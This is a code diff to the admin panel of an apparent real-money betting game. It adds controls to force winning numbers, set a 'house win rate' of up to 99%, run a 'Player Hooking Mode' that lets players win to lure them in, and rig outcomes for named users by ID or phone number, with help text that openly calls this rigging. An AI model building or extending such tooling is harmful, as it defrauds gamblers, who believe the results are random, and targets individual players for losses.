@@ -355,10 +355,109 @@ function renderActiveTab(force = false) {
 // -------------------------------------------------------------
 // 1. OUTCOMES CONTROLLER VIEW & GRACEFUL PAUSE/RESUME
 // -------------------------------------------------------------
+// Help explanations dictionary for ? buttons
+const HELP_EXPLANATIONS = {
+    'FORCE_OUTCOME': {
+        icon: '🎯',
+        title: 'Force Next Round Outcome (Priority 1)',
+        body: `
+            <p><b>Working Principle:</b> Manually forces the exact next winning number (0-9) for the active game mode.</p>
+            <p style="margin-top:8px;"><b>Priority:</b> <b>Level 1 (Highest Override)</b>. Overrides all Smart Risk Engine algorithms, win-rate sliders, and targeted user settings for <u>1 round only</u>.</p>
+            <p style="margin-top:8px;"><b>Usage:</b> Tap any number (0-9) below to lock it. Tap <b>Reset to Auto Engine</b> to restore automated control.</p>
+        `
+    },
+    'HOUSE_WIN_RATE': {
+        icon: '💰',
+        title: 'Smart House Profit & Win Rate Slider',
+        body: `
+            <p><b>Working Principle:</b> Controls the target percentage of rounds where the engine selects the candidate outcome (0-9) yielding maximum net profit for the house.</p>
+            <p style="margin-top:8px;"><b>Formula:</b> At round settlement, the engine evaluates all 10 candidate outcomes (0 to 9) and calculates:<br><code style="color:var(--primary); background:rgba(0,0,0,0.4); padding:4px 8px; border-radius:4px; display:inline-block; margin-top:4px;">Net House Profit = Total Bets Volume - Total User Payout</code></p>
+            <p style="margin-top:8px;"><b>Probability Roll:</b> If set to 80%, 80% of settled rounds will automatically select outcomes where Net House Profit is maximized. The remaining 20% allow natural player winning variance to keep players engaged.</p>
+        `
+    },
+    'STRATEGY_PRESETS': {
+        icon: '⚡',
+        title: 'Risk Engine Strategy Presets',
+        body: `
+            <p><b>Quick Strategy Profiles:</b></p>
+            <ul style="padding-left:18px; margin-top:6px; font-size:12px;">
+                <li style="margin-bottom:6px;"><b>🛡️ Safe House Mode (95% House Win Rate):</b> Maximum profitability. Selects lowest payout candidate outcome in 95% of rounds. Protects against player winning streaks.</li>
+                <li style="margin-bottom:6px;"><b>⚖️ Balanced Mode (80% House Win Rate):</b> Default standard gaming profile. Balances high house margin with steady player payouts.</li>
+                <li style="margin-bottom:6px;"><b>🎣 Player Hooking Mode (40% House Win Rate):</b> Promotes user winning streaks (60% player win rate). Used to attract new players or boost engagement.</li>
+                <li style="margin-bottom:6px;"><b>🎲 Fair Random Mode (50% Fair Odds):</b> Simulates balanced 50/50 odds without bias.</li>
+            </ul>
+        `
+    },
+    'TARGETED_USERS': {
+        icon: '🎯',
+        title: 'Targeted User Individual Control (Rigging)',
+        body: `
+            <p><b>Working Principle:</b> Target a specific user by UID or Mobile Phone Number to force specific outcomes whenever they place a bet.</p>
+            <p style="margin-top:8px;"><b>Modes:</b></p>
+            <ul style="padding-left:18px; margin-top:6px; font-size:12px;">
+                <li style="margin-bottom:4px;"><b style="color:var(--accent-green);">ALWAYS_WIN:</b> Whenever this user bets, the engine picks a winning outcome for them.</li>
+                <li style="margin-bottom:4px;"><b style="color:var(--accent-red);">ALWAYS_LOSE:</b> Whenever this user bets, the engine picks an outcome where their bet loses.</li>
+            </ul>
+            <p style="margin-top:8px;"><b>Priority:</b> <b>Level 2 (High Override)</b>. Takes precedence over general House Win Rate slider, but yields to Level 1 Force Selection.</p>
+        `
+    },
+    'MAX_PAYOUT_CAP': {
+        icon: '🛡️',
+        title: 'High-Roller Safeguard (Max Payout Cap)',
+        body: `
+            <p><b>Working Principle:</b> Sets a hard limit on the total payout amount allowed for a single round.</p>
+            <p style="margin-top:8px;"><b>Safeguard Logic:</b> Candidate numbers whose total payout would exceed the Max Payout Cap are filtered out, preventing massive sudden losses from high-rollers.</p>
+        `
+    },
+    'LIVE_EXPOSURE_HEATMAP': {
+        icon: '🔥',
+        title: 'Real-Time Candidate Net Profit Matrix',
+        body: `
+            <p><b>Working Principle:</b> Real-time simulation showing the exact House Net Profit and User Payout for every number (0 through 9) if that number wins in the active countdown period.</p>
+            <p style="margin-top:8px;"><b>Color Indicators:</b></p>
+            <ul style="padding-left:18px; margin-top:6px; font-size:12px;">
+                <li style="margin-bottom:4px;"><b style="color:var(--accent-green);">Green Margin (+100%):</b> Maximum house profit (zero or low payout).</li>
+                <li style="margin-bottom:4px;"><b style="color:var(--accent-red);">Red Deficit (Negative Net Profit):</b> House loss scenario.</li>
+            </ul>
+        `
+    }
+};
+
+function attachHelpModalHandlers(container) {
+    container.querySelectorAll('.help-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            const helpKey = btn.dataset.help;
+            const helpData = HELP_EXPLANATIONS[helpKey];
+            if (helpData) {
+                const modal = document.getElementById('help-explanation-modal');
+                const modalIcon = document.getElementById('help-modal-icon');
+                const modalTitle = document.getElementById('help-modal-title');
+                const modalBody = document.getElementById('help-modal-body');
+                
+                if (modal && modalIcon && modalTitle && modalBody) {
+                    modalIcon.textContent = helpData.icon || '❓';
+                    modalTitle.textContent = helpData.title || 'System Explanation';
+                    modalBody.innerHTML = helpData.body || '';
+                    modal.style.display = 'flex';
+                }
+            }
+        });
+    });
+}
+
 function renderOutcomesView(container) {
     const overrideVal = liveData.overrides ? liveData.overrides[selectedMode] : null;
     const exposure = (liveData.liveExposures && liveData.liveExposures[selectedMode]) || {};
     const modeConfig = (liveData.config && liveData.config.modes && liveData.config.modes[selectedMode]) || { enabled: true, paused: false, pausePending: false };
+    const riskEngine = (liveData.config && liveData.config.riskEngine) || {
+        enabled: true,
+        strategyMode: 'BALANCED',
+        houseWinRatePercent: 80,
+        maxPayoutCap: 50000,
+        targetedUsers: {}
+    };
 
     let statusBadgeText = 'ACTIVE (Running)';
     let statusBadgeColor = 'var(--accent-green)';
@@ -374,81 +473,243 @@ function renderOutcomesView(container) {
         statusBadgeBg = 'rgba(245,158,11,0.2)';
     }
 
+    const targetedUsers = riskEngine.targetedUsers || {};
+    const targetedUserKeys = Object.keys(targetedUsers);
+
     container.innerHTML = `
         <div class="admin-card">
+            <!-- Game Mode Quick Switch Chips -->
+            <div style="display: flex; gap: 6px; margin-bottom: 12px; overflow-x: auto; padding-bottom: 4px;">
+                ${['30s', '1m', '3m', '5m'].map(m => `
+                    <button class="mode-chip-btn ${selectedMode === m ? 'active' : ''}" data-mode="${m}" style="flex: 1; padding: 6px 10px; font-size: 11px; font-weight: 800; border-radius: 8px; border: 1px solid ${selectedMode === m ? 'var(--primary)' : 'var(--border-color)'}; background: ${selectedMode === m ? 'rgba(245,158,11,0.2)' : 'var(--bg-input)'}; color: ${selectedMode === m ? 'var(--primary)' : 'var(--text-muted)'}; cursor: pointer; white-space: nowrap;">
+                        ${m === '30s' ? '⚡ 30s' : m === '1m' ? '⏱️ 1Min' : m === '3m' ? '⏳ 3Min' : '🕒 5Min'}
+                    </button>
+                `).join('')}
+            </div>
+
+            <!-- Card Header -->
             <div class="card-header">
                 <div>
-                    <div class="card-title">🎯 Smarty91 ${selectedMode} — Round & Outcome Controller</div>
+                    <div class="card-title">🎯 Outcomes & Smart House Engine (${selectedMode})</div>
                     <div style="font-size: 11px; color: var(--text-muted); margin-top: 2px;">
                         Round: <b style="color: #fff;">#${exposure.periodId || '...'}</b> | 
-                        Time: <b style="color: ${exposure.isLocked ? 'var(--accent-red)' : 'var(--accent-green)'};">${exposure.remainingSeconds || 0}s ${exposure.isLocked ? '(LOCKED)' : ''}</b>
+                        Timer: <b style="color: ${exposure.isLocked ? 'var(--accent-red)' : 'var(--accent-green)'};">${exposure.remainingSeconds || 0}s ${exposure.isLocked ? '(LOCKED)' : ''}</b>
                     </div>
                 </div>
                 <div style="text-align: right;">
-                    <span style="font-size: 10px; font-weight: 700; padding: 4px 8px; border-radius: 4px; background: ${overrideVal !== null && overrideVal !== undefined ? 'rgba(245,158,11,0.2)' : 'rgba(16,185,129,0.2)'}; color: ${overrideVal !== null && overrideVal !== undefined ? 'var(--primary)' : 'var(--accent-green)'};">
-                        ${overrideVal !== null && overrideVal !== undefined ? `FORCED OUTCOME (${overrideVal})` : 'AUTO RNG'}
+                    <span style="font-size: 10px; font-weight: 700; padding: 4px 8px; border-radius: 6px; background: ${overrideVal !== null && overrideVal !== undefined ? 'rgba(245,158,11,0.25)' : 'rgba(16,185,129,0.2)'}; color: ${overrideVal !== null && overrideVal !== undefined ? 'var(--primary)' : 'var(--accent-green)'}; border: 1px solid ${overrideVal !== null && overrideVal !== undefined ? 'var(--primary)' : 'var(--accent-green)'};">
+                        ${overrideVal !== null && overrideVal !== undefined ? `FORCED OUTCOME (${overrideVal})` : `SMART ENGINE (${riskEngine.houseWinRatePercent || 80}%)`}
                     </span>
                 </div>
             </div>
 
-            <!-- Mode Pause & Resume Controls -->
-            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                    <div style="font-size: 12px; font-weight: 700; color: #fff;">Game State:</div>
-                    <div style="font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 12px; background: ${statusBadgeBg}; color: ${statusBadgeColor};">
+            <!-- SECTION 1: Graceful Pause & State -->
+            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 10px; margin-bottom: 12px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                    <span style="font-size: 11px; font-weight: 700; color: #fff;">Round Status:</span>
+                    <span style="font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 12px; background: ${statusBadgeBg}; color: ${statusBadgeColor};">
                         ${statusBadgeText}
-                    </div>
+                    </span>
                 </div>
-
-                <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">
-                    <b>Graceful Pause:</b> Allows current active bets and round countdown to complete and settle, then automatically pauses the next round.
-                </p>
-
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px;">
                     ${modeConfig.paused || modeConfig.pausePending ? `
-                        <button id="btn-resume-mode" class="btn-secondary" style="background: var(--accent-green); color: #000; font-weight: 800;">
+                        <button id="btn-resume-mode" class="btn-secondary" style="background: var(--accent-green); color: #000; font-weight: 800; font-size: 11px; padding: 6px;">
                             ▶ Resume Live Mode
                         </button>
                     ` : `
-                        <button id="btn-pause-after-round" class="btn-secondary" style="background: #d97706; color: #fff; font-weight: 700;">
-                            ⏸ Pause After Current Round
+                        <button id="btn-pause-after-round" class="btn-secondary" style="background: #d97706; color: #fff; font-weight: 700; font-size: 11px; padding: 6px;">
+                            ⏸ Pause After Round
                         </button>
                     `}
-                    <button id="btn-pause-immediate" class="btn-secondary" style="background: ${modeConfig.paused ? '#1e293b' : 'rgba(239,68,68,0.25)'}; color: ${modeConfig.paused ? 'var(--text-muted)' : 'var(--accent-red)'};">
-                        ⏹ ${modeConfig.paused ? 'Already Paused' : 'Pause Immediately'}
+                    <button id="btn-pause-immediate" class="btn-secondary" style="background: ${modeConfig.paused ? '#1e293b' : 'rgba(239,68,68,0.25)'}; color: ${modeConfig.paused ? 'var(--text-muted)' : 'var(--accent-red)'}; font-size: 11px; padding: 6px;">
+                        ⏹ ${modeConfig.paused ? 'Already Paused' : 'Pause Now'}
                     </button>
                 </div>
             </div>
 
-            <!-- Outcome Selection Matrix -->
-            <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">
-                Tap any number below to <b>FORCE the next winning number</b> for Smarty91 ${selectedMode}:
-            </p>
+            <!-- SECTION 2: Level 1 - Manual Force Outcome Matrix -->
+            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <div style="font-size: 12px; font-weight: 800; color: var(--primary); display: flex; align-items: center;">
+                        1-Tap Manual Force Outcome (Level 1)
+                        <button type="button" class="help-btn" data-help="FORCE_OUTCOME" style="margin-left:6px;">?</button>
+                    </div>
+                    <span style="font-size: 10px; color: var(--text-muted);">Priority #1</span>
+                </div>
 
-            <div class="number-matrix">
-                ${[0,1,2,3,4,5,6,7,8,9].map(num => {
-                    const prop = NUMBER_PROPERTIES[num];
-                    const isSel = overrideVal === num;
-                    return `
-                        <button class="num-btn ${isSel ? 'selected' : ''}" data-num="${num}" data-color="${prop.color}">
-                            ${num}
-                        </button>
-                    `;
-                }).join('')}
+                <div class="number-matrix" style="margin-bottom: 8px;">
+                    ${[0,1,2,3,4,5,6,7,8,9].map(num => {
+                        const prop = NUMBER_PROPERTIES[num];
+                        const isSel = overrideVal === num;
+                        return `
+                            <button class="num-btn ${isSel ? 'selected' : ''}" data-num="${num}" data-color="${prop.color}" style="font-size: 14px; padding: 8px 0;">
+                                ${num}
+                            </button>
+                        `;
+                    }).join('')}
+                </div>
+
+                <div style="display: flex; gap: 6px;">
+                    <button id="btn-reset-auto" class="btn-secondary" style="flex: 1; font-size: 11px; padding: 6px;">
+                        🔄 Reset to Auto Smart Engine
+                    </button>
+                    <button id="btn-pick-random" class="btn-secondary" style="flex: 1; background: rgba(14,165,233,0.2); color: var(--accent-blue); font-size: 11px; padding: 6px;">
+                        🎲 Force Random Number
+                    </button>
+                </div>
             </div>
 
-            <div style="display: flex; gap: 8px; margin-top: 14px;">
-                <button id="btn-reset-auto" class="btn-secondary" style="flex: 1;">
-                    🔄 Reset to Auto RNG
-                </button>
-                <button id="btn-pick-random" class="btn-secondary" style="flex: 1; background: var(--accent-blue);">
-                    🎲 Random Pick
-                </button>
+            <!-- SECTION 3: Level 3 - Smart House Risk & Strategy Controls -->
+            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                    <div style="font-size: 12px; font-weight: 800; color: #fff; display: flex; align-items: center;">
+                        Smart House Risk Strategy & Win-Rate
+                        <button type="button" class="help-btn" data-help="HOUSE_WIN_RATE" style="margin-left:6px;">?</button>
+                    </div>
+                    <span style="font-size: 10px; font-weight: 800; color: var(--primary);">Active Mode: ${riskEngine.strategyMode || 'BALANCED'}</span>
+                </div>
+
+                <!-- Strategy Presets -->
+                <div style="margin-bottom: 10px;">
+                    <div style="font-size: 10px; color: var(--text-muted); font-weight: 700; margin-bottom: 6px; display: flex; align-items: center;">
+                        STRATEGY PRESETS
+                        <button type="button" class="help-btn" data-help="STRATEGY_PRESETS" style="margin-left:4px; width:16px; height:16px; font-size:10px;">?</button>
+                    </div>
+                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 6px;">
+                        <button class="btn-secondary risk-preset-btn" data-mode="SAFE_HOUSE" data-rate="95" style="font-size: 10.5px; padding: 6px; background: ${riskEngine.strategyMode === 'SAFE_HOUSE' ? 'var(--primary)' : 'rgba(245,158,11,0.15)'}; color: ${riskEngine.strategyMode === 'SAFE_HOUSE' ? '#000' : 'var(--primary)'}; font-weight: 800;">
+                            🛡️ Safe House (95% House Win)
+                        </button>
+                        <button class="btn-secondary risk-preset-btn" data-mode="BALANCED" data-rate="80" style="font-size: 10.5px; padding: 6px; background: ${riskEngine.strategyMode === 'BALANCED' ? 'var(--accent-blue)' : 'rgba(14,165,233,0.15)'}; color: ${riskEngine.strategyMode === 'BALANCED' ? '#fff' : 'var(--accent-blue)'}; font-weight: 800;">
+                            ⚖️ Balanced (80% House Win)
+                        </button>
+                        <button class="btn-secondary risk-preset-btn" data-mode="HOOKING" data-rate="40" style="font-size: 10.5px; padding: 6px; background: ${riskEngine.strategyMode === 'HOOKING' ? 'var(--accent-green)' : 'rgba(16,185,129,0.15)'}; color: ${riskEngine.strategyMode === 'HOOKING' ? '#000' : 'var(--accent-green)'}; font-weight: 800;">
+                            🎣 Hooking (40% House Win)
+                        </button>
+                        <button class="btn-secondary risk-preset-btn" data-mode="FAIR" data-rate="50" style="font-size: 10.5px; padding: 6px; background: ${riskEngine.strategyMode === 'FAIR' ? 'var(--accent-violet)' : 'rgba(139,92,246,0.15)'}; color: ${riskEngine.strategyMode === 'FAIR' ? '#fff' : 'var(--accent-violet)'}; font-weight: 800;">
+                            🎲 Fair Random (50/50)
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Custom House Win Rate Slider -->
+                <div style="margin-bottom: 10px;">
+                    <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 800; margin-bottom: 4px;">
+                        <span style="color: var(--primary);">House Profit Rate: <span id="label-winrate-val">${riskEngine.houseWinRatePercent || 80}%</span></span>
+                        <span style="color: var(--accent-green);">Player Win Rate: <span id="label-playerwin-val">${100 - (riskEngine.houseWinRatePercent || 80)}%</span></span>
+                    </div>
+                    <input type="range" id="slider-house-winrate" min="50" max="99" step="1" value="${riskEngine.houseWinRatePercent || 80}" style="width: 100%; accent-color: var(--primary); cursor: pointer;" />
+                </div>
+
+                <!-- High-Roller Safeguard Cap -->
+                <div>
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px;">
+                        <label class="form-label" style="font-size: 11px; margin: 0; display: flex; align-items: center;">
+                            High-Roller Max Payout Limit (₹)
+                            <button type="button" class="help-btn" data-help="MAX_PAYOUT_CAP" style="margin-left:4px; width:16px; height:16px; font-size:10px;">?</button>
+                        </label>
+                    </div>
+                    <div style="display: flex; gap: 6px;">
+                        <input type="number" id="input-max-payout-cap" class="form-input" value="${riskEngine.maxPayoutCap || 50000}" min="1000" step="5000" style="font-size: 12px; padding: 6px;" />
+                        <button type="button" id="btn-save-risk-config" class="btn-primary" style="padding: 6px 12px; font-size: 11px; white-space: nowrap; font-weight: 800;">
+                            💾 Apply Risk Rules
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SECTION 4: Level 2 - Targeted User Control (Rigging) -->
+            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 12px; margin-bottom: 14px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <div style="font-size: 12px; font-weight: 800; color: #fff; display: flex; align-items: center;">
+                        Targeted User Direct Control (Rigging)
+                        <button type="button" class="help-btn" data-help="TARGETED_USERS" style="margin-left:6px;">?</button>
+                    </div>
+                    <span style="font-size: 10px; color: var(--text-muted);">Priority #2</span>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1.2fr 1fr auto; gap: 6px; margin-bottom: 8px;">
+                    <input type="text" id="input-target-user-key" class="form-input" placeholder="User ID or Phone No." style="font-size: 11px; padding: 6px;" />
+                    <select id="select-target-action" class="form-input" style="font-size: 11px; padding: 6px;">
+                        <option value="ALWAYS_WIN">🟢 ALWAYS WIN</option>
+                        <option value="ALWAYS_LOSE">🔴 ALWAYS LOSE</option>
+                    </select>
+                    <button type="button" id="btn-add-targeted-user" class="btn-primary" style="font-size: 11px; padding: 6px 10px; font-weight: 800;">
+                        + Target
+                    </button>
+                </div>
+
+                <!-- Active Targeted Users List -->
+                ${targetedUserKeys.length === 0 ? `
+                    <div style="font-size: 11px; color: var(--text-muted); font-style: italic; text-align: center; padding: 4px 0;">
+                        No individual users targeted. All users run under Smart House Engine.
+                    </div>
+                ` : `
+                    <div style="display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px;">
+                        ${targetedUserKeys.map(key => {
+                            const status = targetedUsers[key];
+                            const isWin = status === 'ALWAYS_WIN';
+                            return `
+                                <div style="display: flex; align-items: center; gap: 4px; background: var(--bg-card); border: 1px solid ${isWin ? 'rgba(16,185,129,0.4)' : 'rgba(239,68,68,0.4)'}; padding: 4px 8px; border-radius: 6px; font-size: 11px;">
+                                    <span style="font-weight: 800; color: #fff;">${key}</span>
+                                    <span style="font-size: 9px; font-weight: 800; padding: 2px 4px; border-radius: 4px; background: ${isWin ? 'rgba(16,185,129,0.2)' : 'rgba(239,68,68,0.2)'}; color: ${isWin ? 'var(--accent-green)' : 'var(--accent-red)'};">
+                                        ${isWin ? 'WIN' : 'LOSE'}
+                                    </span>
+                                    <button type="button" class="btn-remove-target" data-key="${key}" style="background: none; border: none; color: var(--text-muted); font-weight: 800; cursor: pointer; padding: 0 2px;">✕</button>
+                                </div>
+                            `;
+                        }).join('')}
+                    </div>
+                `}
+            </div>
+
+            <!-- SECTION 5: Live Period Candidate Net Profit Heatmap (0-9 Matrix) -->
+            <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 12px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <div style="font-size: 12px; font-weight: 800; color: #fff; display: flex; align-items: center;">
+                        Live Candidate Net Profit Heatmap (0 - 9)
+                        <button type="button" class="help-btn" data-help="LIVE_EXPOSURE_HEATMAP" style="margin-left:6px;">?</button>
+                    </div>
+                    <span style="font-size: 10px; color: var(--accent-green); font-weight: 800;">
+                        Total Volume: ₹${(exposure.totalBetVolume || 0).toLocaleString('en-IN')}
+                    </span>
+                </div>
+
+                <div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px;">
+                    ${[0,1,2,3,4,5,6,7,8,9].map(num => {
+                        const candidate = exposure.candidateMatrix ? exposure.candidateMatrix[num] : null;
+                        const payout = candidate ? candidate.payout : 0;
+                        const netProfit = candidate ? candidate.netProfit : 0;
+                        const margin = candidate ? candidate.marginPercent : 100;
+                        const isProfit = netProfit >= 0;
+
+                        return `
+                            <div style="background: var(--bg-card); border: 1px solid ${isProfit ? 'rgba(16,185,129,0.3)' : 'rgba(239,68,68,0.4)'}; border-radius: 6px; padding: 6px; text-align: center;">
+                                <div style="font-size: 12px; font-weight: 900; color: var(--primary);">#${num}</div>
+                                <div style="font-size: 9px; color: var(--text-muted); margin-top: 2px;">Payout</div>
+                                <div style="font-size: 10px; font-weight: 700; color: #fff;">₹${payout}</div>
+                                <div style="font-size: 9px; font-weight: 800; margin-top: 2px; color: ${isProfit ? 'var(--accent-green)' : 'var(--accent-red)'};">
+                                    ${isProfit ? '+' : ''}₹${netProfit}
+                                </div>
+                            </div>
+                        `;
+                    }).join('')}
+                </div>
             </div>
         </div>
     `;
 
-    // Event Bindings
+    // Attach Help Modals
+    attachHelpModalHandlers(container);
+
+    // Mode Chips Event Listeners
+    container.querySelectorAll('.mode-chip-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            selectedMode = btn.dataset.mode;
+            renderActiveTab(true);
+        });
+    });
+
+    // Outcome Matrix Number Click Listeners (Level 1 Override)
     container.querySelectorAll('.num-btn').forEach(btn => {
         btn.addEventListener('click', async () => {
             const num = Number(btn.dataset.num);
@@ -486,6 +747,7 @@ function renderOutcomesView(container) {
         });
     }
 
+    // Pause / Resume Event Listeners
     const pauseGracefulBtn = container.querySelector('#btn-pause-after-round');
     if (pauseGracefulBtn) {
         pauseGracefulBtn.addEventListener('click', async () => {
@@ -521,6 +783,92 @@ function renderOutcomesView(container) {
             }
         });
     }
+
+    // Risk Presets Click Listeners
+    container.querySelectorAll('.risk-preset-btn').forEach(btn => {
+        btn.addEventListener('click', async () => {
+            const modeName = btn.dataset.mode;
+            const rate = Number(btn.dataset.rate);
+            try {
+                await adminService.updateRiskEngineConfig({
+                    strategyMode: modeName,
+                    houseWinRatePercent: rate
+                });
+                await fetchAndRefreshData();
+            } catch (err) {
+                alert(err.message);
+            }
+        });
+    });
+
+    // Win Rate Slider Real-time display update
+    const sliderWinRate = container.querySelector('#slider-house-winrate');
+    const labelWinRate = container.querySelector('#label-winrate-val');
+    const labelPlayerWin = container.querySelector('#label-playerwin-val');
+    if (sliderWinRate && labelWinRate && labelPlayerWin) {
+        sliderWinRate.addEventListener('input', () => {
+            const val = Number(sliderWinRate.value);
+            labelWinRate.textContent = `${val}%`;
+            labelPlayerWin.textContent = `${100 - val}%`;
+        });
+    }
+
+    // Save Risk Rules Button
+    const saveRiskBtn = container.querySelector('#btn-save-risk-config');
+    if (saveRiskBtn) {
+        saveRiskBtn.addEventListener('click', async () => {
+            const winRate = Number(container.querySelector('#slider-house-winrate')?.value || 80);
+            const maxCap = Number(container.querySelector('#input-max-payout-cap')?.value || 50000);
+            try {
+                await adminService.updateRiskEngineConfig({
+                    strategyMode: 'CUSTOM',
+                    houseWinRatePercent: winRate,
+                    maxPayoutCap: maxCap
+                });
+                await fetchAndRefreshData();
+                alert('✅ Smart Risk Engine settings saved successfully!');
+            } catch (err) {
+                alert(err.message);
+            }
+        });
+    }
+
+    // Add Targeted User
+    const addTargetBtn = container.querySelector('#btn-add-targeted-user');
+    if (addTargetBtn) {
+        addTargetBtn.addEventListener('click', async () => {
+            const keyInput = container.querySelector('#input-target-user-key');
+            const actionSelect = container.querySelector('#select-target-action');
+            const userKey = keyInput?.value?.trim();
+            const action = actionSelect?.value;
+
+            if (!userKey) {
+                alert('Please enter a valid User ID or Phone Number');
+                return;
+            }
+
+            try {
+                await adminService.updateTargetedUser(userKey, action);
+                keyInput.value = '';
+                await fetchAndRefreshData();
+            } catch (err) {
+                alert(err.message);
+            }
+        });
+    }
+
+    // Remove Targeted User
+    container.querySelectorAll('.btn-remove-target').forEach(btn => {
+        btn.addEventListener('click', async () => {
+            const key = btn.dataset.key;
+            try {
+                await adminService.updateTargetedUser(key, 'REMOVE');
+                await fetchAndRefreshData();
+            } catch (err) {
+                alert(err.message);
+            }
+        });
+    });
 }
 
 // -------------------------------------------------------------
